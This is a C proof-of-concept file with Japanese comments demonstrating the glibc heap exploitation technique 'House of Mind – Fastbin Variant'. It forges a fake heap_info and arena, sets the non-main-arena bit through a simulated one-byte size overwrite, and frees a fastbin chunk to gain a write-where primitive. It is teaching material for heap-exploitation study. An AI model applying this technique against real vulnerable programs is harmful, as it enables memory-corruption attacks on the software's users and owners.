#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>
#include <assert.h>

/*

House of Mind - Fastbin Variant
==========================

この攻撃は、偽の non-main arena を使って新しい場所に書き込むという点で、
元の 'House of Mind' に似ています。ただし、元の攻撃の 'fastbin' 版では、
fastbin を WRITE-WHERE プリミティブ (primitive) に使います。元の解説は
https://dl.packetstormsecurity.net/papers/attack/MallocMaleficarum.txt にあり、
より新しい記事(私によるもの)は https://maxwelldulin.com/BlogPost?post=2257705984 にあります。

任意の数のチャンクを確保でき、チャンクの size に対する 1 バイトの上書きができ、
さらにメモリのリークがあれば、非常に強力なプリミティブを制御できます。

これは、解放されたポインタを任意の場所に書き込むために使えます
(こちらのほうが有用そうです)。あるいは、
write-large-value-WHERE プリミティブ (unsortedbin attack に似たもの) としても使えます。
どちらもそれぞれ興味深いものですが、状況さえ整えば、最初の方法が最も強力なプリミティブです。

malloc のチャンクには size が指定されており、この size 情報には
特別なメタデータの属性 (prev_inuse、mmap チャンク、non-main arena) があります。
この攻撃の焦点は non-main arena の利用です。詳しくは
https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/ を読んでください。

まず、チャンクから non-main arena がどのように分かるのかを理解する必要があります。

これが 'heap_info' 構造体です:

struct _heap_info
{
  mstate ar_ptr;           // Arena for this heap. <--- Malloc State pointer
  struct _heap_info *prev; // Previous heap.
  size_t size;            // Current size in bytes.
  size_t mprotect_size;   // Size in bytes that has been mprotected
  char pad[-6 * SIZE_SZ & MALLOC_ALIGN_MASK]; // Proper alignment
} heap_info; 
- https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/arena.c#L48

重要な点は、arena 内の 'malloc_state' が ar_ptr から取得されることです。
ar_ptr はこの構造体の最初の要素です。Malloc_state == mstate == arena です。

main arena には特別なポインタがあります。一方、non-main arena (mstate) は
ヒープ領域の先頭にあります。これらは次のコードで取得されます。
'arena_for_chunk' の 'ptr' はユーザーが制御できます:

#define heap_for_ptr(ptr) \
  ((heap_info *) ((unsigned long) (ptr) & ~(HEAP_MAX_SIZE - 1)))
#define arena_for_chunk(ptr) \
  (chunk_non_main_arena (ptr) ? heap_for_ptr (ptr)->ar_ptr : &main_arena)
- https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/arena.c#L127

このマクロは 'ptr' を受け取り、大きな値を引きます。'heap_info' はこのヒープ領域の
先頭にあるはずだからです。そして、それを使って、使用する 'arena' を見つけられます。

この攻撃の考え方は、fastbin のチャンクを解放するときの 'arena_for_chunk' の機能を悪用し、
偽の arena を使って、本来書き込まれるべきでない場所にポインタを書き込むことです。

この POC は次のことを行います:
- non-main arena にとって有効な arena の場所を見つけます。
- arena のデータの値を制御できる non-main arena の場所に到達するのに
  十分な数のヒープチャンクを確保します。
- 後で arena として使われる 'ar_ptr' を指定するために、偽の 'heap_info' を作ります。
- この偽の arena (ar_ptr) を使うと、fastbin を使って、
  'ar_ptr' の想定外の場所にヒープのポインタを書き込めます。

要件:
- 偽の 'heap_info' の場所を知るための、ヒープのリーク。
	- 特別なスプレー技法で回避できる可能性があります
- 無制限の回数の確保
- チャンクの size に対する 1 バイトのオーバーフロー
	- fastbin に入れられる必要があります。
	- つまり、tcache がないか、tcache が満杯である必要があります。
- malloc state (ar_ptr) の場所には、解放される fastbin のサイズより大きい値が
  malloc_state.system_mem になければなりません。そうでないと、
  チャンクは無効だとみなされます。
	- これは手動で挿入できます。または、値を適切に並べることで、
	  慎重に実現できます。
- 解放されるチャンクの「次の」チャンクは、有効な size でなければなりません
(繰り返しになりますが、0x20 より大きく、かつ malloc_state.system_mem より小さい必要があります)


ちょっとした利点:
- 同じ場所に対して、異なるサイズの fastbin チャンクを使って、
  複数回行えます。
- unsorted bin attack と違って、malloc を壊しません。
- 要件は 3 つだけです: 無限の確保、1 バイトのバッファオーバーフロー、ヒープメモリのリーク。



************************************
Written up by Maxwell Dulin (Strikeout) 
************************************
*/

int main(){

	printf("House of Mind - Fastbin Variant\n");
	puts("==================================");
	printf("この技法の目的は、HEAP_MAX_SIZE のオフセットの位置に\n");
	printf("偽の arena を作ることです\n");
	
	printf("そして、チャンクが解放されるときに fastbin へ書き込みます\n");
	printf("これにより、ある程度制約のある WRITE-WHERE プリミティブ (primitive) ができます\n");
	// 確保に関する情報の値。	
	int HEAP_MAX_SIZE = 0x4000000;
	int MAX_SIZE = (128*1024) - 0x100; // MMap threshold: https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L635

	printf("ヒープの最初の位置を見つけます\n");
	// 攻撃の対象の場所と、使用する偽の arena
	uint8_t* fake_arena = malloc(0x1000); 
	uint8_t* target_loc = fake_arena + 0x30;

	uint8_t* target_chunk = (uint8_t*) fake_arena - 0x10;

	/*
	fastbin を格納するために、有効な 'malloc_state' (arena) の 'system_mem' を
	用意します。これが重要なのは、チャンクの size が小さすぎないか、
	大きすぎないかが、'malloc_state' の 'system_mem' で検証されるからです。
	この値は、fastbin のチャンクより大きければ十分です。
	*/
	printf("偽の arena の 'system_mem' (オフセット 0x888) を設定します\n");
	fake_arena[0x888] = 0xFF;
	fake_arena[0x889] = 0xFF; 
	fake_arena[0x88a] = 0xFF; 

	printf("上書きする対象のメモリアドレス: %p\n", target_loc);
	printf("HEAP_MAX_SIZE (0x%x) のオフセットの位置にデータを設定する必要があります\n", HEAP_MAX_SIZE);

	// 偽の arena の位置を計算します
	uint64_t new_arena_value = (((uint64_t) target_chunk) + HEAP_MAX_SIZE) & ~(HEAP_MAX_SIZE - 1);
	uint64_t* fake_heap_info = (uint64_t*) new_arena_value;

	uint64_t* user_mem = malloc(MAX_SIZE);
	printf("偽の Heap Info 構造体の位置: %p\n", fake_heap_info);
	printf("MAX_HEAP_SIZE のオフセットに到達するまで確保します\n");	

	/* 
	偽の arena は、ヒープ上の特定のオフセットになければなりません。
	そのため、次のチャンクがその arena 内に入るまで、
	多数のチャンクを確保します。この値は上で計算しました。
	*/
	while((long long)user_mem < new_arena_value){
		user_mem = malloc(MAX_SIZE);
	}

	// 後でこれを使って、とんでもない事態を引き起こします
	printf("攻撃の被害者となる fastbin サイズのチャンクを作ります\n");
	uint64_t* fastbin_chunk = malloc(0x50); // size は 0x60
	uint64_t* chunk_ptr = fastbin_chunk - 2; // mem ではなくチャンクを指します
	printf("上書きする Fastbin チャンク: %p\n", fastbin_chunk);

	printf("fastbin が使われるように、TCache を埋めます\n");
	// 後で fastbin が使われるように、tcache を埋めます。
	uint64_t* tcache_chunks[7];
	for(int i = 0; i < 7; i++){
		tcache_chunks[i] = malloc(0x50);
	}	
	for(int i = 0; i < 7; i++){
		free(tcache_chunks[i]);
	}


	/*
	heap_state 用の偽の malloc_state ポインタを作ります。
	これは、上で示した 'heap_info' 構造体の 'ar_ptr' です。
	これはヒープ上の 'heap_info' 構造体の最初の要素で、
	オフセット 0x0 にあります。

	これを、値を書き込みたい場所に設定します。
	実際に書き込まれる場所は、解放される fastbin チャンクの
	サイズによって決まります。オフセットは 0x8 から 0x40 バイトの間になります。
	例えば、size が 0x20 のチャンクは fastbinsY 構造体の
	0 番目のインデックスに入ります。これに書き込むときは、
	書き込んだ元の値から 8 のオフセットの位置に書き込むことになります。
	- https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L1686
	*/
	printf("heap_info 構造体の 'ar_ptr' (偽の arena) を %p に設定します\n", fake_arena);
	fake_heap_info[0] = (uint64_t) fake_arena; // 偽の ar_ptr (arena) を設定します
	printf("攻撃前の、%p への書き込み対象の値: 0x%x\n", target_loc, *(target_loc));

	/*
	size に non-main arena ビットを設定します。
	さらに、size は元の確保時と同じに保ちます。fastbin には
	(解放時に) 次のチャンクが有効な size を持つかどうかの
	健全性チェックがあるためです。

	non-main arena を取得するときに、私たちが選んだ arena が使われます!
	そこから、チャンクの size のために、fastbin へ書き込みが行われます。

	///// 脆弱性! チャンクの size を上書きします
	*/
	printf("fastbin のチャンクに non-main arena ビットを設定します\n");
	puts("注: 実際のチャンクの size は変更していないので、次のチャンクの size は有効なままです\n");
	chunk_ptr[1] = 0x60 | 0x4; // non-main arena ビットを設定します

	//// 脆弱性ここまで

	/*
	fastbin チャンクのアドレスが書き込まれるオフセットは、
	使われている fastbin と malloc_state 自体によって決まります。
	2.31 では、malloc_state の先頭から fastbinsY 配列までの
	オフセットは 0x10 です。さらに、fastbinsY[0x4] は
	追加で 0x20 バイトのオフセットです。合計すると、arena の位置からの
	書き込みオフセットは 0x30 バイトです。
	arena の位置から、実際に書き込みが行われる場所までです。
	これは、unsorted bin attack の bk - 0x10 に似た考え方です。
	*/

	printf("non-main arena ビットが設定された fastbin のチャンクを解放すると、\n");
	printf("偽の 'heap_info' 構造体が使われます。\n");
	printf("これにより、偽の arena の場所が参照され、\n");
	printf("arena ポインタのあるオフセットの位置にヒープのアドレスが書き込まれます。\n");

	printf("チャンクを解放して、魔法を発動させます!\n");
	free(fastbin_chunk); // 狂乱を引き起こします

	// この fastbin のチャンクサイズでは、オフセットは 0x28 です。
	printf("%p への書き込み対象の値: 0x%llx\n", target_loc, *((unsigned long long*) (target_loc)));
	assert(*((unsigned long *) (target_loc)) != 0);
}
